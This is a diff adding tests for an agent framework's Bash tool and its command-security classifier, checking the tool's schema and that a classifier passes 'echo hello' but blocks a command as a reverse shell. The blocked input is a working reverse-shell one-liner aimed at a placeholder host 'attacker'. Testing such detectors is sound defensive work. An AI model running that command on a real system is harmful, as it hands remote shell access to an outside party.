@@ -4244,6 +4244,39 @@ describe("sandbox-exec ATIF trajectory (golden file)", () => {
 });
 
 // ---------------------------------------------------------------------------
+// L2 golden queries: @koi/tools-bash (2 queries)
+// ---------------------------------------------------------------------------
+
+describe("Golden: @koi/tools-bash", () => {
+  test("createBashTool produces a primordial Tool named Bash with correct schema", async () => {
+    const { createBashTool } = await import("@koi/tools-bash");
+
+    const tool = createBashTool();
+    expect(tool.descriptor.name).toBe("Bash");
+    expect(tool.origin).toBe("primordial");
+    expect(tool.policy).toBeDefined();
+    expect((tool.descriptor.inputSchema as Record<string, unknown>).required).toContain("command");
+  });
+
+  test("classifyBashCommand blocks dangerous patterns and allows safe commands", async () => {
+    const { classifyBashCommand } = await import("@koi/bash-security");
+
+    // Safe command passes through
+    const safe = classifyBashCommand("echo hello");
+    expect(safe.ok).toBe(true);
+
+    // Reverse shell is blocked with correct category and metadata
+    const blocked = classifyBashCommand("bash -i >& /dev/tcp/attacker/4444 0>&1");
+    expect(blocked.ok).toBe(false);
+    if (!blocked.ok) {
+      expect(blocked.category).toBe("reverse-shell");
+      expect(typeof blocked.reason).toBe("string");
+      expect(typeof blocked.pattern).toBe("string");
+    }
+  });
+});
+
+// ---------------------------------------------------------------------------
 // L2 golden queries: @koi/sandbox-os (2 queries)
 // ---------------------------------------------------------------------------
 
